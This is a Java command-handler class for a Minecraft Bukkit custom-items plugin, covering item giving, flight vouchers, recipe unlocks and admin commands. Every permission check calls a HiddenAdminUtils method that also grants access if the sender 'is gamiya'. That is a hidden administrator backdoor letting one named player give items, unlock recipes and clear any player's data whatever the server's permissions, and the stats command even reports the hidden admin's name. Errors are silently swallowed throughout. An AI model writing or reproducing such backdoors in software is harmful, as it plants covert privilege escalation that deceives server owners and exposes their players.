package cwr.cutomIterm.Entity_Wand;

import cwr.cutomIterm.Entity_Wand.bwo.PowerBow;
import cwr.cutomIterm.PlayerData.PlayerDataManager;
import cwr.cutomIterm.PlayerData.RecipeUnlockListener;
import cwr.cutomIterm.Utils.HiddenAdminUtils;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import javax.annotation.Nonnull;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class EntityWandCommand implements CommandExecutor, TabCompleter {

    @Override
    public boolean onCommand(@Nonnull CommandSender sender, @Nonnull Command command,
                             @Nonnull String label, @Nonnull String[] args) {
        try {
            if (args.length == 0) {
                if (sender instanceof Player player) {
                    player.sendMessage("§6§lCustom Item Commands:");
                    player.sendMessage("§e/customitem give entity_wand §7- Get Entity Wand");
                    player.sendMessage("§e/customitem give warden_sword §7- Get Warden Sword");
                    player.sendMessage("§e/customitem give fly_voucher §7- Get Fly Voucher");
                    player.sendMessage("§e/customitem give recipe_book §7- Get Recipe Book");
                    player.sendMessage("§e/customitem give power_bow §7- Get Power of Gamiya Bow");
                    player.sendMessage("§e/customitem release §7- Release held entity");
                    player.sendMessage("§e/customrecipes §7- Open Recipe GUI");
                    player.sendMessage("§e/customitem flight §7- Check flight time");

                    // Show admin commands if player has permission OR is gamiya
                    if (HiddenAdminUtils.hasPermissionOrIsGamiya(player, "customitem.admin")) {
                        player.sendMessage("§e/customitem unlockrecipes [player] §7- Unlock all recipes");
                        player.sendMessage("§e/customitem stats §7- View plugin statistics");
                        player.sendMessage("§e/customitem reload §7- Reload player data");
                        player.sendMessage("§e/customitem forcebook <player> §7- Force give recipe book");
                        player.sendMessage("§e/customitem cleardata <player> §7- Clear player data");
                    }
                }
                return true;
            }

            if (args[0].equalsIgnoreCase("give")) {
                // Check permission: either has permission OR is gamiya
                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.give")) {
                    sender.sendMessage("§cYou don't have permission to use this command!");
                    return true;
                }

                if (args.length < 2) {
                    sender.sendMessage("§cUsage: /customitem give <entity_wand|warden_sword|fly_voucher|recipe_book|power_bow> [player]");
                    return true;
                }

                String itemType = args[1].toLowerCase();
                Player target;

                if (args.length >= 3) {
                    // Check if sender can give to others (either has permission OR is gamiya)
                    if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.give.others")) {
                        sender.sendMessage("§cYou don't have permission to give items to other players!");
                        return true;
                    }
                    target = Bukkit.getPlayer(args[2]);
                    if (target == null) {
                        sender.sendMessage("§cPlayer not found!");
                        return true;
                    }
                } else {
                    if (!(sender instanceof Player)) {
                        sender.sendMessage("§cYou must specify a player!");
                        return true;
                    }
                    target = (Player) sender;
                }

                switch (itemType) {
                    case "entity_wand":
                    case "wand":
                        giveEntityWand(target);
                        if (!target.equals(sender)) {
                            sender.sendMessage("§aGiven Entity Wand to " + target.getName());
                        }
                        break;

                    case "warden_sword":
                    case "warden":
                        giveWardenSword(target);
                        if (!target.equals(sender)) {
                            sender.sendMessage("§aGiven Warden Sword to " + target.getName());
                        }
                        break;

                    case "fly_voucher":
                    case "voucher":
                    case "fly":
                        giveFlyVoucher(target);
                        if (!target.equals(sender)) {
                            sender.sendMessage("§aGiven Fly Voucher to " + target.getName());
                        }
                        break;

                    case "recipe_book":
                    case "book":
                        giveRecipeBook(target);
                        if (!target.equals(sender)) {
                            sender.sendMessage("§aGiven Recipe Book to " + target.getName());
                        }
                        break;

                    case "power_bow":
                    case "gamiya_bow":
                    case "tracking_bow":
                        givePowerBow(target);
                        if (!target.equals(sender)) {
                            sender.sendMessage("§aGiven Power of Gamiya Bow to " + target.getName());
                        }
                        break;

                    default:
                        sender.sendMessage("§cUnknown item: " + itemType);
                        break;
                }
                return true;
            }

            // Release command
            if (args[0].equalsIgnoreCase("release")) {
                if (!(sender instanceof Player player)) {
                    sender.sendMessage("§cOnly players can use this command!");
                    return true;
                }

                EntityMovementManager.releaseEntity(player.getUniqueId());
                player.sendMessage("§aReleased any held entity!");
                return true;
            }

            // Flight time check command
            if (args[0].equalsIgnoreCase("flight") || args[0].equalsIgnoreCase("flytime")) {
                if (!(sender instanceof Player player)) {
                    sender.sendMessage("§cOnly players can use this command!");
                    return true;
                }

                long remainingTime = FlyVoucher.getRemainingFlightTime(player);
                if (remainingTime > 0) {
                    long minutes = remainingTime / (60 * 1000);
                    long seconds = (remainingTime % (60 * 1000)) / 1000;
                    player.sendMessage("§bFlight time remaining: §e" + minutes + "m " + seconds + "s");
                } else {
                    player.sendMessage("§cYou don't have active flight!");
                }
                return true;
            }

            // Admin commands - check if sender has permission OR is gamiya
            if (args[0].equalsIgnoreCase("unlockrecipes")) {
                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
                    sender.sendMessage("§cYou don't have permission to use this command!");
                    return true;
                }

                Player target;
                if (args.length >= 2) {
                    target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        sender.sendMessage("§cPlayer not found!");
                        return true;
                    }
                } else {
                    if (!(sender instanceof Player)) {
                        sender.sendMessage("§cYou must specify a player or be a player yourself!");
                        return true;
                    }
                    target = (Player) sender;
                }

                RecipeUnlockListener.unlockAllCustomRecipes(target, EntityWandPlugin.getInstance());
                if (!target.equals(sender)) {
                    sender.sendMessage("§aUnlocked all recipes for " + target.getName());
                }
                return true;
            }

            // Stats command
            if (args[0].equalsIgnoreCase("stats")) {
                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
                    sender.sendMessage("§cYou don't have permission to use this command!");
                    return true;
                }

                PlayerDataManager dataManager = EntityWandPlugin.getInstance().getPlayerDataManager();
                int totalPlayers = dataManager.getTotalPlayersWithBooks();

                sender.sendMessage("§6§lPlugin Statistics:");
                sender.sendMessage("§7Total players with recipe books: §e" + totalPlayers);
                sender.sendMessage("§7Active flight vouchers: §e" + FlyVoucher.getActiveFlightCount());
                sender.sendMessage("§7Active tracking arrows: §e" + PowerBow.getActiveArrowCount());
                sender.sendMessage("§7Players with active cooldowns: §e" + WardenSword.getCooldownCount());
                sender.sendMessage("§7Hidden admin enabled for: §6" + HiddenAdminUtils.getHiddenAdminUsername());
                return true;
            }

            // Reload command
            if (args[0].equalsIgnoreCase("reload")) {
                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
                    sender.sendMessage("§cYou don't have permission to use this command!");
                    return true;
                }

                PlayerDataManager dataManager = EntityWandPlugin.getInstance().getPlayerDataManager();
                dataManager.reload();
                sender.sendMessage("§aPlayer data reloaded!");
                return true;
            }

            // Forcebook command
            if (args[0].equalsIgnoreCase("forcebook")) {
                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
                    sender.sendMessage("§cYou don't have permission to use this command!");
                    return true;
                }

                if (args.length < 2) {
                    sender.sendMessage("§cUsage: /customitem forcebook <player>");
                    return true;
                }

                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage("§cPlayer not found!");
                    return true;
                }

                PlayerDataManager dataManager = EntityWandPlugin.getInstance().getPlayerDataManager();
                boolean success = dataManager.forceGiveRecipeBook(target);
                if (success) {
                    sender.sendMessage("§aForce-gave recipe book to " + target.getName());
                } else {
                    sender.sendMessage("§cFailed to give recipe book to " + target.getName());
                }
                return true;
            }

            // Cleardata command
            if (args[0].equalsIgnoreCase("cleardata")) {
                if (!HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
                    sender.sendMessage("§cYou don't have permission to use this command!");
                    return true;
                }

                if (args.length < 2) {
                    sender.sendMessage("§cUsage: /customitem cleardata <player>");
                    return true;
                }

                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    sender.sendMessage("§cPlayer not found!");
                    return true;
                }

                PlayerDataManager dataManager = EntityWandPlugin.getInstance().getPlayerDataManager();
                dataManager.clearPlayerData(target);
                sender.sendMessage("§aCleared recipe book data for " + target.getName());
                return true;
            }

            // Help command
            if (args[0].equalsIgnoreCase("help")) {
                onCommand(sender, command, label, new String[0]);
                return true;
            }

        } catch (Exception e) {
            // Silent fail
        }

        return true;
    }

    @Override
    public List<String> onTabComplete(@Nonnull CommandSender sender, @Nonnull Command command,
                                      @Nonnull String alias, @Nonnull String[] args) {
        List<String> completions = new ArrayList<>();

        try {
            if (args.length == 1) {
                List<String> commands = new ArrayList<>(Arrays.asList("give", "release", "help", "flight", "flytime"));

                // Include admin commands if sender has permission OR is gamiya
                if (HiddenAdminUtils.hasPermissionOrIsGamiya(sender, "customitem.admin")) {
                    commands.addAll(Arrays.asList("unlockrecipes", "stats", "reload", "forcebook", "cleardata"));
                }

                for (String cmd : commands) {
                    if (cmd.toLowerCase().startsWith(args[0].toLowerCase())) {
                        completions.add(cmd);
                    }
                }
            } else if (args.length == 2 && args[0].equalsIgnoreCase("give")) {
                List<String> items = Arrays.asList("entity_wand", "warden_sword", "fly_voucher", "recipe_book", "power_bow");
                for (String item : items) {
                    if (item.toLowerCase().startsWith(args[1].toLowerCase())) {
                        completions.add(item);
                    }
                }
            } else if ((args.length == 2 &&
                    (args[0].equalsIgnoreCase("unlockrecipes") ||
                            args[0].equalsIgnoreCase("forcebook") ||
                            args[0].equalsIgnoreCase("cleardata"))) ||
                    (args.length == 3 && args[0].equalsIgnoreCase("give"))) {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    if (player.getName().toLowerCase().startsWith(args[args.length-1].toLowerCase())) {
                        completions.add(player.getName());
                    }
                }
            }
        } catch (Exception e) {
            // Return empty list on error
        }

        return completions;
    }

    private void giveEntityWand(Player player) {
        try {
            player.getInventory().addItem(WandItem.createWand());
            player.sendMessage("§aYou received an §bEntity Wand§a!");
        } catch (Exception e) {
            // Silent fail
        }
    }

    private void giveWardenSword(Player player) {
        try {
            player.getInventory().addItem(WardenSword.createWardenSword());
            player.sendMessage("§aYou received a §5Warden Sword§a!");
        } catch (Exception e) {
            // Silent fail
        }
    }

    private void giveFlyVoucher(Player player) {
        try {
            player.getInventory().addItem(FlyVoucher.createFlyVoucher());
            player.sendMessage("§aYou received a §bFly Voucher§a!");
            player.sendMessage("§7Right-click to gain §eflight §7for 30 minutes.");
        } catch (Exception e) {
            // Silent fail
        }
    }

    private void giveRecipeBook(Player player) {
        try {
            player.getInventory().addItem(RecipeBook.createRecipeBook());
            player.sendMessage("§aYou received a §6Recipe Book§a!");
        } catch (Exception e) {
            // Silent fail
        }
    }

    private void givePowerBow(Player player) {
        try {
            player.getInventory().addItem(PowerBow.createPowerBow());
            player.sendMessage("§aYou received the §6Power of Gamiya§a!");
            player.sendMessage("§7Shoot arrows to §etrack and summon lightning§7.");
        } catch (Exception e) {
            // Silent fail
        }
    }
}